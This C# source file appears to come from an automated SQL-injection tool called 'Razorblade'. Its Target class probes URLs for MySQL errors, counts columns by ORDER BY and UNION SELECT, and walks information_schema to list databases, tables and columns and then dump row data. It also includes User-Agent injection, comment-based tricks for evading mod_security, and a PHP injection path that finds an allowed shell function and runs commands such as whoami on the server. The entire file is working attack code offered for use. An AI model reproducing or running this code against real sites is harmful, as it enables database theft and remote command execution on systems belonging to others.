using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Net;
using System.IO;
using System.Threading;

namespace Razorblade
{
    public enum Vulnerability
    {
        NONE,
        UNION,
        STRING,
        USERAGENT,
        ERROR
    }

    public class ScanStateEventArgs : EventArgs
    {
        public bool Scanning;
    }

    public class Target
    {
        public Config Config;

        public string Host;
        public string URL;
        public string Version;
        public string UserAgent;
        public bool SQL_Vulnerable;
        public bool PHP_Vulnerable;
        public bool Mod_Security;
        public string PHP_ShellCmd;
        public string Server;
        public int Columns;
        public List<int> VulnerableColumns = new List<int>();
        public string Delimiter = "RrektR";
        public string Delimiter2 = "RTrektR";
        public string Delimiter3 = "TrektT";
        public string Charset = "utf8";
        public string Injection_Space = "+";
        public string Injection_ID = "NULL";

        public Vulnerability Vulnerability = Vulnerability.NONE;
        public List<Database> Databases = new List<Database>();

        public event EventHandler<ScanStateEventArgs> ScanStateChanged;

        public Target(string _url, Config cfg)
        {
            URL = _url;
            Config = cfg;
            Host = new Uri(_url).Host;

            UserAgent = Config.Scan_UserAgent;
        }

        private void OnScanStateChanged(object sender, ScanStateEventArgs e)
        {
            if (ScanStateChanged != null)
            {
                ScanStateChanged(sender, e);
            }
        }

        public string GetString(string url)
        {
            if (url == "")
                return "";

            if (Config.Print_Debug)
            {
                if (Vulnerability == Razorblade.Vulnerability.USERAGENT)
                {
                    Util.Log("UserAgent: " + UserAgent, Color.DarkCyan);
                }
                else
                {
                    Util.Log(url, Color.DarkCyan);
                }
            }

            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.AllowAutoRedirect = false;
                req.UserAgent = UserAgent;
                req.Timeout = 8000;
                req.Accept = "text/html";
                req.Method = "GET";
                req.KeepAlive = false;
                req.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
                req.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                req.Headers.Add("Accept-Encoding", "gzip,deflate");

                if (Config.Scan_Proxy_Enabled)
                {
                    req.Proxy = new WebProxy(Config.Scan_Proxy);
                }

                HttpWebResponse ret = (HttpWebResponse)req.GetResponse();

                using (StreamReader read = new StreamReader(ret.GetResponseStream()))
                {
                    string str = read.ReadToEnd();

                    if (str.Contains("Illegal mix of collations for operation") && Charset == "utf8")
                    {
                        Charset = "latin1";
                        Util.Log("Changing charset to latin1", Color.Blue);
                        Util.Log("Refreshing databases might bring up more results", Color.Blue);
                        return GetString(url);
                    }

                    return str;
                }
            }
            catch (WebException wex)
            {
                if (wex.Status == WebExceptionStatus.Timeout)
                {
                    Util.Log("Server timed out", Color.Red);
                }
                else if (wex.Status == WebExceptionStatus.ProtocolError)
                {
                    HttpStatusCode code = ((HttpWebResponse)wex.Response).StatusCode;

                    Util.Log(((int)code).ToString() + " " + code.ToString(), Color.Red);

                    if ((code == HttpStatusCode.NotAcceptable || code == HttpStatusCode.Forbidden) && !Mod_Security)
                    {
                        Mod_Security = true;
                        Util.Log("Enabling mod_security bypass", Color.Blue);
                        return GetString(SanitiseModSecurity(url));
                    }
                }

                return "";
            }
        }

        public bool Test()
        {
            Util.Log("Testing for vulnerabilities: " + URL, Color.DarkBlue);

            SQL_Vulnerable = false;
            PHP_Vulnerable = false;

            string[] chars = {"'", @"\"};

            foreach (string ch in chars)
            {
                string ret = GetString(URL + ch);

                if (ret.Contains("You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax") ||
                    ret.Contains("supplied argument is not a valid MySQL result resource") ||
                    ret.Contains("Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given"))
                {
                    SQL_Vulnerable = true;
                    Util.Log("Target is vulnerable to SQL injection", Color.Green);
                    return true;
                }
                else if (ret.Contains("Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE"))
                {
                    if (GetString(URL + "';echo('" + Delimiter + "').'").Contains(Delimiter))
                    {
                        PHP_Vulnerable = true;
                        Util.Log("Target is vulnerable to PHP injection", Color.Green);

                        PHP_GetShell();
                    }
                }
            }

            UserAgent = "'";

            string ss = GetString(URL);

            if (ss.Contains("You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax") ||
                ss.Contains("supplied argument is not a valid MySQL result resource") ||
                ss.Contains("Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given"))
            {
                Util.Log("Target vulnerable to User Agent injection", Color.Green);
                SQL_Vulnerable = true;
                Vulnerability = Razorblade.Vulnerability.USERAGENT;
                return true;
            }
            else
            {
                Util.Log("Target is not vulnerable to SQL injection", Color.Red);
                return false;
            }
        }

        public void PHP_Shell(string cmd)
        {
            if (PHP_ShellCmd.Length == 0)
                return;

            string ret = GetString(URL + "';echo('" + Delimiter + "');" + PHP_ShellCmd + "('" + cmd + "');echo('" + Delimiter2 + "').'");
        }

        public void PHP_GetShell()
        {
            string ret = GetString(URL + "';echo('" + Delimiter + "');ini_get('disable_functions');echo('" + Delimiter2 + "').'");
            string dd = Util.GetBetween(ret, Delimiter, Delimiter2);

            if (dd.Contains("shell_exec"))
            {
                if (dd.Contains("system"))
                {
                    if (dd.Contains("exec"))
                    {
                        Util.Log("PHP shell access has been blocked", Color.Red);
                    }
                    else
                    {
                        PHP_ShellCmd = "exec";
                    }
                }
                else
                {
                    PHP_ShellCmd = "system";
                }
            }
            else
            {
                PHP_ShellCmd = "shell_exec";
            }

            if (PHP_ShellCmd.Length > 0)
            {
                Util.Log("PHP shell access: " + PHP_ShellCmd, Color.Green);
            }
        }

        public void PHP_GetUser()
        {
            string ret = GetString(URL + "';echo('" + Delimiter + "');system('whoami');echo('" + Delimiter2 + "').'");

            if (ret.Contains(Delimiter))
            {
                Util.Log("PHP running as user: " + Util.GetBetween(ret, Delimiter, Delimiter2), Color.Blue);
            }
            else
            {
                Util.Log("Failed to inject PHP", Color.Red);
            }
        }

        public string ConcatColumns()
        {
            string str = "";

            for (int i = 1; i < Columns + 1; i++)
            {
                str += i.ToString();

                if (i < Columns)
                {
                    str += ",";
                }
            }

            return str;
        }

        public string ConcatColumns(int cols)
        {
            string str = "";

            for (int i = 1; i < cols + 1; i++)
            {
                str += i.ToString();

                if (i < cols)
                {
                    str += ",";
                }
            }

            return str;
        }

        public string ConcatColumns(List<Column> cols, string delimiter = ",")
        {
            string str = "";

            for (int i = 0; i < cols.Count; i++)
            {
                str += "CONVERT(" + cols[i].Name + " USING " + Charset + ")";

                if (i < cols.Count - 1)
                {
                    str += delimiter;
                }
            }

            return str;
        }

        public void GetAll(object obj)
        {
            ScanStateEventArgs e = new ScanStateEventArgs();
            e.Scanning = true;

            OnScanStateChanged(null, e);

            Test();
            GetColumns();
            GetVulnerableColumns();
            GetDatabases();

            e.Scanning = false;
            OnScanStateChanged(null, e);
        }

        public string SanitiseModSecurity(string str)
        {
            if (!Mod_Security)
                return str;

            string ret = str;

            ret = ret.Replace("union", "/*!50000unIOn*/");
            ret = ret.Replace("select", "/*!50000sElecT*/");
            ret = ret.Replace("group_concat", "coNcAt/*!50000");
            ret = ret.Replace("))", "))*/");
            ret = ret.Replace("information_schema", "/*!information_schema*/");

            return ret;
        }

        public string InjectQuery(string query)
        {
            string ascii = Util.GetASCII(Delimiter);
            string ascii2 = Util.GetASCII(Delimiter2);
            string col = GetVulnerableColumn();
            string str = "group_concat(CHAR(" + ascii + ")," + query + ",CHAR(" + ascii2 + "))";
            string ret = ConcatColumns();

            if (ret.Contains("," + col + ","))
            {
                ret = ret.Replace("," + col + ",", "," + str + ",");
            }
            else if(ret.Contains("," + col))
            {
                ret = ret.Replace("," + col, "," + str);
            }
            else
            {
                ret = ret.Replace(col, str);
            }

            return ret;
        }

        // BuildQuery(new string[] {"order", "by"});
        public string BuildQuery(string[] query, string spacing = "+", string id = "NULL")
        {
            string str = Util.Concat(query, spacing);

            if (id.EndsWith("'"))
            {
                str += "--+";
            }

            str = id + spacing + str;

            if (Mod_Security)
            {
                return SanitiseModSecurity(str);
            }

            if (Vulnerability == Razorblade.Vulnerability.USERAGENT)
            {
                UserAgent = str;
                return "";
            }

            return str;
        }

        public void GetColumns()
        {
            if (!SQL_Vulnerable)
                return;

            int columns = Config.Scan_Columns_Max;

            string[] exts = { "", "'" };
            string[] ids = {"-1", "1", "NULL", "@@new"};
            string[] spaces = { "+", " " };
            string[] orders = { "order", "group" };

            foreach (string ext in exts)
            {
                foreach (string id in ids)
                {
                    foreach (string space in spaces)
                    {
                        foreach (string order in orders)
                        {
                            string ret = GetString(URL + BuildQuery(new string[] { order, "by", "100" }, space, id + ext));

                            if (ret.Contains("Unknown column '100' in 'order clause'") || ret.Contains("mysql_fetch_array() expects parameter 1 to be resource, boolean given"))
                            {
                                Injection_ID = id + ext;
                                Injection_Space = space;
                                Util.Log("Found vulnerability", Color.Green);

                                int cols = Config.Scan_Columns_Max;

                                    while (cols >= 1)
                                    {
                                        string ss = GetString(URL + BuildQuery(new string[] { order, "by", cols.ToString() }, Injection_Space, Injection_ID));

                                        if (ss.Contains("Unknown column '" + cols.ToString() + "' in '" + order) || ss.Contains("mysql_fetch_array() expects parameter 1 to be resource, boolean given"))
                                        {
                                            cols--;
                                        }
                                        else
                                        {
                                            Util.Log("Found " + cols.ToString() + " columns", Color.Green);
                                            if (cols == Config.Scan_Columns_Max)
                                            {
                                                Util.Log("The amount of columns is the same as the maximum setting in scan options, this might be a false positive", Color.Blue);
                                            }
                                            Columns = cols;
                                            return;
                                        }
                                    }

                                cols = Config.Scan_Columns_Max;

                                while (cols >= 1)
                                {
                                    string ss = GetString(URL + BuildQuery(new string[] { "union", "select", ConcatColumns(cols) }, Injection_Space, Injection_ID));

                                    if (ss.Contains("The used SELECT statements have a different number of columns"))
                                    {
                                        cols--;
                                    }
                                    else
                                    {
                                        Util.Log("Found " + cols.ToString() + " columns", Color.Green);
                                        if (cols == Config.Scan_Columns_Max)
                                        {
                                            Util.Log("The amount of columns is the same as the maximum setting in scan options, this might be a false positive", Color.Blue);
                                        }
                                        Columns = cols;
                                        return;
                                    }
                                }

                                Util.Log("Couldn't get the amount of columns", Color.Red);
                                return;
                            }
                        }
                    }
                }
            }

            Util.Log("Couldn't find vulnerability", Color.Red);
           
        }

        public string GetVulnerableColumn()
        {
            if (VulnerableColumns.Count == 0)
                return "1";

            return VulnerableColumns.Max().ToString();
        }

        public void GetVulnerableColumns()
        {
            if (Columns == 0)
                return;

            string ascii = Util.GetASCII(Delimiter);
            string ascii2 = Util.GetASCII(Delimiter2);

            List<string> strList = new List<string>();
            strList.Add("union");
            strList.Add("select");

            string str = "";

            for (int i = 1; i < Columns + 1; i++)
            {
                str += "group_concat(CHAR(" + ascii + ")," + i.ToString() + ",CHAR(" + ascii2 + "))";

                if (i < Columns)
                {
                    str += ",";
                }
            }

            strList.Add(str);

            string ret = GetString(URL + BuildQuery(strList.ToArray(), Injection_Space, Injection_ID));

            if (ret.Contains("The used SELECT statements have a different number of columns"))
            {
                Vulnerability = Razorblade.Vulnerability.ERROR;
            }

            int tmp = ret.Split(new string[] { Delimiter }, StringSplitOptions.RemoveEmptyEntries).Length - 1;

            if (tmp > 0)
            {
                Util.Log(tmp.ToString() + " vulnerable columns found", Color.Green);

                for (int i = 0; i < tmp; i++)
                {
                    string col = Util.GetBetween(ret, Delimiter, Delimiter2, i);

                    if (Config.Print_Debug)
                    {
                        Util.Log("Vulnerable column: " + col, Color.Blue);
                    }

                    VulnerableColumns.Add(Convert.ToInt32(col));
                }

                string ss = GetString(URL + BuildQuery(new string[] { "union", "select", InjectQuery("version()") }, Injection_Space, Injection_ID));
                Version = Util.GetBetween(ss, Delimiter, Delimiter2);

                Util.Log("Database version: " + Version, Color.Blue);

                if (Version.StartsWith("4"))
                {
                    //Util.Log("Server uses MySQL 4", Color.Red);
                }
            }
            else
            {
                Util.Log("Couldn't find vulnerable columns", Color.Red);

                if (Columns >= Config.Scan_Columns_Max)
                {
                    Util.Log("Increasing the maximum columns might find the vulnerable columns", Color.Blue);

                    //Temp_Max_Columns = Config.Scan_Columns_Max;
                    // TODO: Automatically increase maximum columns
                }
            }
        }

        public void GetDatabase()
        {
            if (VulnerableColumns.Count == 0)
                return;

            string ret = GetString(URL + BuildQuery(new string[] {"union", "select", InjectQuery("database()")}, Injection_Space, Injection_ID));
            string name = Util.GetBetween(ret, Delimiter, Delimiter2);

            Database db = new Database();
            db.Name = name;
            db.Target = this;

            Databases.Add(db);

            Util.Log("Found database", Color.Green);

            if (Config.Print_Debug)
            {
                Util.Log("Database name: " + name, Color.Blue);
            }

            Util.AddDB(name);

            if (Config.Scan_Tables_Auto)
            {
                GetTables(db);
            }
        }

        public void GetDatabases()
        {
            if (VulnerableColumns.Count == 0)
                return;

            string ret = GetString(URL + BuildQuery(new string[] {"union", "select", InjectQuery("CONVERT(schema_name USING " + Charset + ")"), "from", "information_schema.schemata"}, Injection_Space, Injection_ID));
            int tmp = ret.Split(new string[] { Delimiter }, StringSplitOptions.RemoveEmptyEntries).Length - 1;

            if (tmp > 0)
            {
                Util.Log("Found " + tmp.ToString() + " databases", Color.Green);

                for (int i = 0; i < tmp; i++)
                {
                    string name = Util.GetBetween(ret, Delimiter, Delimiter2, i);

                    if (Databases.Count(x => x.Name == name) == 0)
                    {
                        if (Config.Print_Debug)
                        {
                            Util.Log("Database name: " + name, Color.Blue);
                        }

                        Util.AddDB(name);

                        Database db = new Database();
                        db.Name = name;
                        db.Target = this;

                        Databases.Add(db);

                        if (name != "information_schema" && Config.Scan_Tables_Auto)
                        {
                            // TODO: ThreadPool.QueueUserWorkItem
                            GetTables(db);
                        }
                    }
                }
            }
            else
            {
                GetDatabase();
            }
        }

        public void GetTables(Database db)
        {
            if (VulnerableColumns.Count == 0)
                return;

            string ret = GetString(URL + BuildQuery(new string[] {"union", "select", InjectQuery("CONVERT(table_name USING " + Charset + ")"), "from", "information_schema.tables", "where", "table_schema=CHAR(" + Util.GetASCII(db.Name) + ")"}, Injection_Space, Injection_ID));
            int tmp = ret.Split(new string[] { Delimiter }, StringSplitOptions.RemoveEmptyEntries).Length - 1;

            Util.Log("Found " + tmp.ToString() + " tables on " + db.Name, Color.Green);

            for (int i = 0; i < tmp; i++)
            {
                string name = Util.GetBetween(ret, Delimiter, Delimiter2, i);

                if (db.Tables.Count(x => x.Name == name) == 0)
                {
                    if (Config.Print_Debug)
                    {
                        Util.Log("Table name: " + name, Color.Blue);
                    }

                    Util.AddTable(db.Name, name);

                    Table tab = new Table();
                    tab.Name = name;
                    tab.Database = db;

                    db.Tables.Add(tab);
                }
            }

        }

        public void GetColumns(Table tab)
        {
            if (VulnerableColumns.Count == 0)
                return;

            string ret = GetString(URL + BuildQuery(new string[] {"union", "select", InjectQuery("CONVERT(column_name USING " + Charset + ")"), "from", "information_schema.columns", "where", "table_schema=CHAR(" + Util.GetASCII(tab.Database.Name) + ")", "and", "table_name=CHAR(" + Util.GetASCII(tab.Name) + ")"}, Injection_Space, Injection_ID));
            int tmp = ret.Split(new string[] { Delimiter }, StringSplitOptions.RemoveEmptyEntries).Length - 1;

            Util.Log("Found " + tmp.ToString() + " columns on " + tab.Name, Color.Green);

            for (int i = 0; i < tmp; i++)
            {
                string name = Util.GetBetween(ret, Delimiter, Delimiter2, i);

                if (tab.Columns.Count(x => x.Name == name) == 0)
                {
                    if (Config.Print_Debug)
                    {
                        Util.Log("Column name: " + name, Color.Blue);
                    }

                    Util.AddColumn(tab.Database.Name, tab.Name, name);

                    Column col = new Column();
                    col.Name = name;
                    col.Table = tab;

                    tab.Columns.Add(col);
                }
            }
        }

        public void GetData(Table tab)
        {
            if (VulnerableColumns.Count == 0)
                return;

            string columns = ConcatColumns(tab.Columns);

            string ascii = Util.GetASCII(Delimiter);
            string ascii2 = Util.GetASCII(Delimiter2);
            string ascii3 = Util.GetASCII(Delimiter3);

            columns = columns.Replace(",", ",CHAR(" + ascii3 + "),");

            string ret = GetString(URL + BuildQuery(new string[] {"union", "select", InjectQuery(columns), "from", tab.Database.Name + "." + tab.Name}, Injection_Space, Injection_ID));
            int tmp = ret.Split(new string[] { Delimiter }, StringSplitOptions.RemoveEmptyEntries).Length - 1;

            Util.Log("Found " + tmp.ToString() + " rows from " + tab.Name, Color.Green);

            for (int i = 0; i < tmp; i++)
            {
                string[] d = Util.GetBetween(ret, Delimiter, Delimiter2, i).Split(new string[] {Delimiter3}, StringSplitOptions.None);

                Row row = new Row();
                row.Table = tab;
                row.Data.AddRange(d);

                tab.Rows.Add(row);
                Util.AddData(row);
            }
        }

    }
}
